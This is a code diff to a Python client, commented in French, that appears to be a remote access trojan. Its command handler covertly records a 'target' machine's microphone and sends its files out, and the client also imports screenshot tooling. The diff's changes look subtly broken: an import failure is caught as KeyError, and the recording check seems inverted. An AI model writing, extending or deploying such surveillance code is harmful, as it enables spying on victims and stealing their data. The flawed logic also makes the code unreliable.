@@ -1,15 +1,14 @@
-
-
 import socket, os, subprocess, sys, re, platform, tqdm
 from datetime import datetime
 try:
     import pyautogui
+    import sounddevice as sd
 except KeyError:
     # On test si la cible dispose d'un dispositif d'affichage, pour le cas des server en console 
     pyautogui_imported = False
 else:
     pyautogui_imported = True
-import sounddevice as sd
+
 from tabulate import tabulate
 from scipy.io import wavfile
 import psutil, GPUtil
@@ -89,13 +88,16 @@ class Client:
         
         elif (match := re.search(r"recordmic\s*([a-zA-Z0-9]*)(\.[a-zA-Z]*)\s*(\d*)", command)):
             # Enregistrer le micro par defautpresent sur le poste 
-            audio_filename = match.group(1) + match.group(2)
-            try:
-                seconds = int(match.group(3))
-            except ValueError:
-                # Si aucune seconde fournis en parametre, prendre 10 seconde par default 
-                seconds = 10
-            output = self.record_audio(audio_filename, seconds=seconds)
+            if pyautogui_imported == False:
+                audio_filename = match.group(1) + match.group(2)
+                try:
+                    seconds = int(match.group(3))
+                except ValueError:
+                    # Si aucune seconde fournis en parametre, prendre 10 seconde par default 
+                    seconds = 10
+                output = self.record_audio(audio_filename, seconds=seconds)
+            else:
+                output = None 
 
         elif (match := re.search(r"download\s*(.*)", command)):
             # Recuperer le filename et envoyer si existe 
